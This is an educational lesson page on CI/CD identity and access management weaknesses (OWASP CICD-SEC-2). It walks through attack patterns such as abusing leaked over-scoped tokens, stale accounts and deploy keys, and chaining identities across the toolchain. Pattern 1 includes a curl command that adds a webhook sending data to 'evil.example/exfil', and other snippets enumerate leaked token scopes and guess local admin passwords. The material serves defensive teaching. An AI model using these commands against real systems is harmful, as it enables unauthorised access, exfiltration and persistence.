# CICD-SEC-2: Inadequate Identity and Access Management - Attack Vectors

## Table of Contents
- [Understanding IAM Attack Vectors](#understanding-iam-attack-vectors)
- [Core Attack Flow](#core-attack-flow)
- [Common Attack Patterns](#common-attack-patterns)
- [Chaining Identities Across the Toolchain](#chaining-identities-across-the-toolchain)

## Understanding IAM Attack Vectors

> **⚠ EDUCATIONAL PURPOSE ONLY** — the techniques below are shown so you can find and fix these issues in systems you own or are authorised to test.

Inadequate IAM is rarely exploited through a clever payload. It is exploited through **reach**: an attacker obtains one identity—often a machine identity or token they were never supposed to see—and then discovers it can do far more, in far more systems, than it should. Because the pipeline links SCM, CI, registries, and cloud, an identity with excess scope becomes a bridge from a low-value foothold to production.

The attacker's goal in this category is usually one of:

- Acquire a credential (leaked token, PAT, key, or a stale/shared account) that is over-permissioned.
- Use its excess scope to read code and secrets, or to write to code, pipelines, and artifacts.
- Pivot along the toolchain until the identity's reach touches production or the software supply chain.

### Core Attack Flow

```
1. Obtain an identity
   ↓
   Leaked token/PAT, stale account, shared bot login, phished human
2. Enumerate its reach
   ↓
   List repos, orgs, CI projects, registry scopes, cloud permissions
3. Abuse excess privilege
   ↓
   Read secrets, alter pipeline, push artifact, assume a broader role
4. Pivot across systems
   ↓
   SCM -> CI -> registry -> cloud, escalating at each hop
5. Persist
   ↓
   Mint new non-expiring tokens, add deploy keys, create service accounts
```

## Common Attack Patterns

### 1. Abusing an Over-Permissioned CI Token

A pipeline token scoped far beyond its job is captured (from a log, a cache, or a compromised runner) and used directly against the platform API.

```
# The job only needed to read one repo, but the token can write org-wide.
$ curl -H "Authorization: Bearer $LEAKED_CI_TOKEN" \
       https://scm.example.com/api/v4/projects?membership=true
# -> returns every project the token can reach (far more than one)

$ curl -H "Authorization: Bearer $LEAKED_CI_TOKEN" \
       -X POST https://scm.example.com/api/v4/projects/42/hooks \
       -d "url=https://evil.example/exfil"
# -> attacker adds a webhook to exfiltrate future events
```

**Payoff**: read of many private repos and write access to configuration—all from one over-scoped machine credential.

### 2. Broad, Non-Expiring Personal Access Tokens (PATs)

A developer PAT with org-wide scope and no expiry leaks (committed to a repo, pasted in a ticket, embedded in a fork).

```
# Discover what the token can do
$ curl -H "Authorization: token $LEAKED_PAT" https://api.github.com/user
$ curl -H "Authorization: token $LEAKED_PAT" -I https://api.github.com/user
# Response header reveals granted scopes:
X-OAuth-Scopes: repo, workflow, admin:org, delete_repo, write:packages
```

**Payoff**: because the token never expires, the attacker has durable access to code, workflows, org settings, and packages until a human happens to notice and revoke it.

### 3. Local Accounts That Bypass SSO and MFA

The organisation enforces SSO+MFA—but a tool keeps a local admin account outside the IdP.

```
# SSO login is protected; the local one is not.
POST /login HTTP/1.1            # Jenkins/GitLab/registry local form
Content-Type: application/json

{"username":"admin","password":"<guessed-or-reused>"}
-> 200 OK    # no MFA challenge, no conditional access, no central log
```

**Payoff**: credential stuffing and password reuse work against the one door that skips every central control—and the login may not even appear in SSO audit logs.

### 4. Reusing a Shared Bot / Service Account

A single generic automation account is used by many people and pipelines, so its credential is widely known and widely stored.

```
deploy-bot  -> password in a shared vault note, no MFA, no owner
            -> permissions = union of every task it ever did
            -> used by 12 humans + 3 pipelines simultaneously
```

**Payoff**: one compromise yields high, accumulated privilege; the shared nature means the intrusion cannot be attributed to a person and cannot be contained without breaking everyone who relies on the account.

### 5. Exploiting Stale Identities After Offboarding

Deprovisioning removed the SSO login but left other credentials alive.

```
former-employee SSO login      -> disabled  ✓
former-employee SCM PAT        -> still valid ✗
former-employee CI local user  -> still valid ✗
former-employee cloud key      -> still valid ✗
```

**Payoff**: a departed insider (or whoever later obtains those credentials) retains a working path into code and infrastructure long after access should have ended.

### 6. Standing External Collaborator and Integration Access

An outside collaborator or third-party app holds write access that was never time-boxed.

```
contractor@vendor.example   role: Write on 40 repos (engagement ended)
"marketplace-app"           scope: read/write code + CI, no expiry
```

**Payoff**: compromising the contractor's account, or the third-party integration's tokens, hands the attacker legitimate write access into the codebase—often with no anomaly to trigger alerts.

### 7. Unrotated Machine Credentials and Deploy Keys

SSH deploy keys, robot tokens, and cloud access keys that were never rotated remain valid indefinitely.

```
# A deploy key added years ago still grants write to a prod repo
$ git push git@scm.example.com:org/prod-service.git HEAD:main
# succeeds with a key nobody remembers issuing
```

**Payoff**: durable write access to critical repositories and infrastructure with a credential that has no expiry and no owner watching it.

### 8. Self-Registration and Weak Provisioning

A tool allows self-service sign-up, or new users are auto-added to broad default groups.

```
registry/gitlab: "Anyone can register" enabled
default group on join: "Developers" (write to all repos)
```

**Payoff**: an attacker registers an account (or an over-broad default grant applies to a low-trust user) and immediately has more access than intended.

### 9. Privilege Escalation via Permission Sprawl

Inconsistent RBAC across systems means an identity that is low-privilege in one tool is high-privilege in another.

```
SCM:      user is "read-only" on repos
CI:       same user can edit any pipeline (maps to a broad CI role)
Cloud:    the pipeline they can edit assumes an Administrator role
Result:   "read-only" on paper -> production admin in practice
```

**Payoff**: the gap between how RBAC is modelled in each silo lets an attacker escalate simply by moving to the tool where the same identity is over-privileged.

### 10. Minting Persistence From a Foothold

Once inside with a sufficiently privileged identity, the attacker creates *new* durable identities.

```
- Create a new service account / PAT with no expiry
- Add an attacker-controlled SSH deploy key to a repo
- Invite an external collaborator they control
- Add a machine user to an admin group
```

**Payoff**: even if the original credential is later revoked, the attacker retains independent, quiet re-entry that blends in with legitimate automation.

## Chaining Identities Across the Toolchain

The defining danger of inadequate IAM is that individually modest footholds combine into full compromise as the identity's reach crosses system boundaries:

```
Leaked over-scoped PAT (SCM)      -> read many repos, find a CI config
        +
CI service account = admin         -> read all CI secrets, edit the pipeline
        +
Registry publish token in CI       -> push a backdoored image/package
        +
Pipeline assumes cloud Admin role  -> deploy it and reach production data
        =  supply-chain + production breach from a single identity
```

Another common chain built entirely on governance gaps:

```
Offboarded contractor's PAT still valid  -> log into SCM (no MFA path)
        -> local Jenkins admin account reused elsewhere
        -> unrotated cloud access key found in a pipeline variable
        -> create a new non-expiring service account for persistence
```

## Key Takeaways

1. **Inadequate IAM is exploited by reach, not payloads**—one over-permissioned identity becomes a bridge across the toolchain.
2. **Machine identities are the prize**—leaked CI tokens, PATs, deploy keys, and robot accounts give quiet, high-privilege access.
3. **Scope and expiry decide the blast radius**—a broad, non-expiring credential turns a small leak into a large breach.
4. **Local and shared accounts undermine every central control**—they skip MFA, skip logging, and survive offboarding.
5. **Attackers pivot and persist**—they escalate through RBAC gaps and mint fresh identities to keep access after revocation.

## Next Steps

- **[Prevention Guide](prevention.md)**: Build least-privilege, centrally governed identity
- **[Code Examples](examples.md)**: Insecure vs. secure IAM in GitHub Actions, GitLab, Jenkins, and IdP/SSO
- **[CI/CD Security Track](/learn/cicd)**: Continue the OWASP Top 10 CI/CD lessons
- **[Practice](/practice)**: Test your understanding with hands-on challenges
